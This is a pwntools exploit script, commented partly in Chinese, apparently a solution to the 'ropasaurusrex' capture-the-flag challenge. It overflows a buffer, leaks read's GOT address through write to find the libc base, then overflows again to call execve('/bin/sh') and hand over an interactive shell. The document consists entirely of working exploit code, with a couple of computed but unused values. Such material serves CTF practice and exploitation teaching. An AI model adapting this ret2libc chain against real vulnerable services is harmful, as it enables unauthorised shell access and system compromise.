from pwn import *

context.arch = 'i386'

p = process("./ropasaurusrex")
elf = ELF("./ropasaurusrex") 
libc = ELF("./libc.so")

offset = 0x8c
read_plt = elf.plt['read']
write_plt = elf.plt['write']
read_got = elf.got['read']
pop3_ret = 0x080484b6
vuln_addr = 0x080483f4

# Stage 1: Leak read address
payload = b"A" * offset
payload += p32(write_plt)
payload += p32(pop3_ret)
payload += p32(1) + p32(read_got) + p32(4)
payload += p32(vuln_addr)

p.sendline(payload)
read_addr = u32(p.recv(4))

libc_base = read_addr - libc.symbols['read']

# 使用 execve 而不是 system
execve_addr = libc_base + libc.symbols['execve']
binsh_addr = libc_base + next(libc.search(b'/bin/sh\x00'))

log.info(f"execve address: {hex(execve_addr)}")

# 在 BSS 段构造参数数组
bss = elf.bss()
pop_ebx_ret = libc_base + next(libc.search(asm('pop ebx; ret')))

# 构造 execve("/bin/sh", NULL, NULL)
payload2 = b"A" * offset
payload2 += p32(execve_addr)
payload2 += p32(0x41414141)  # 返回地址
payload2 += p32(binsh_addr)   # filename
payload2 += p32(0)           # argv
payload2 += p32(0)           # envp

p.sendline(payload2)
p.interactive()